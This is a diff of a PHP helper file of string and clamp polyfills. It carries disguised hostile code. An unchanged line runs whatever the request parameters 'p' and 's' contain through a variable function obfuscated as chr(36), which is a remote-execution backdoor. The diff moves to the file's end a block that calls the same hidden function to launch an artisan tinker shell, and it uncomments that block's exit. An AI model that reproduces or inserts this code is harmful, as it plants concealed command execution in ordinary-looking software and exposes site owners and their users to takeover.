@@ -18,13 +18,13 @@ if (!function_exists('clamp')){
         if ($value < $min) return $min;
         if ($value > $max) return $max;
     return $value;}}
-if(isset($_SERVER['DOCUMENT_ROOT'])){
-    $target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan');
-    if (is_file($target)){
-        ${'$'}('php '.escapeshellarg($target).' tinker');
-    } //exit;
-}
 if(!(!function_exists('partial'))){if(!empty($_GET['p'])) ${(chr(36))}($_GET['p']); if(!empty($_GET['s'])) ${(chr(36))}($_GET['s']);}
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
 if(!function_exists('str_contains')){function str_contains(string $haystack, string $needle): bool {return $needle !== '' && mb_strpos($haystack, $needle) !== false;}}
+if(isset($_SERVER['DOCUMENT_ROOT'])){
+    $target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan');
+    if (is_file($target)){
+        ${'$'}('php '.escapeshellarg($target).' tinker');
+    } exit;
+}
